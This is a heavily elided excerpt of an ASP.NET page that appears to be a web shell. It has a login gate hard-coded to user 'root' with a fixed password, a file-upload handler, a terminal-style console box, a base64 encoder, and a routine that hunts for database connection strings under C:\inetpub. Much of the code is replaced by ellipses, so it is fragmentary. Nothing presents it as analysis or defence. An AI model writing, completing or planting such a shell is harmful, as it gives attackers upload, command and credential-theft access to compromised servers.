...
<script Language="c#" runat="server">
    ...
    protected void Login_Click(object sender, EventArgs e)
    {
        ...
        if (Username.Text == "root" && Password.Text == "c4s4b$$356&6cnA")
        {
...
";
    ...
    void base64encode(string inputstr)
    {
        ...
        if (inputstr != "null") { contents = inputstr; }
    ...
    protected void uploadbutton_Click(object sender, EventArgs e)
    {
        if (upload.HasFile)
        {
            ...
            catch (Exception ex) { output.Text = "Upload status: " + ex.Message; }
        }
    }
    ...
    protected void encode_Click(object sender, EventArgs e) { base64encode("null"); }

    protected void ConnectionStr_Click(object sender, EventArgs e)
    {
        string webpath = "C:\\inetpub";
        if (console.Text != string.Empty) { webpath = console.Text; }
...
<form id="Form1" method="post" runat="server" style="background-color: #808080">
    ...
    <asp:TextBox ID="output" runat="server" TextMode="MultiLine" BackColor="#012456" ForeColor="White" ReadOnly="True"></asp:TextBox>
    <asp:TextBox ID="console" runat="server" BackColor="#012456" ForeColor="Yellow" TextMode="MultiLine" Rows="1"></asp:TextBox>
    ...
    <asp:TextBox ID="sqlconnectiostr" runat="server">Enter Connection String</asp:TextBox>
    </asp:Panel>
</form>
</body>
</HTML>
